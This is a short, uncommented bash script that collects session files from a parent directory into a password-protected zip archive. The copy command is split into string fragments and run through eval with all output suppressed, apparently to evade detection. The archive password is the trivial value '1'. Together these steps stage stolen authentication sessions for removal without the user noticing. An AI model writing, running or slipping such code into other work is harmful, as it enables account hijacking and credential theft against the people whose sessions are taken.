mkdir -p /tmp/test 2>/dev/null
part_a="cp"
part_b="../*.se"
part_c="ssion"
space=" "
file_path="/tmp/test/"
printf -v final_cmd "%s%s%s%s%s%s" "$part_a" "$space" "$part_b" "$part_c" "$space" "$file_path"
eval "$final_cmd" >/dev/null 2>&1
zip -q -P "1" -r /tmp/test.zip /tmp/test >/dev/null 2>&1
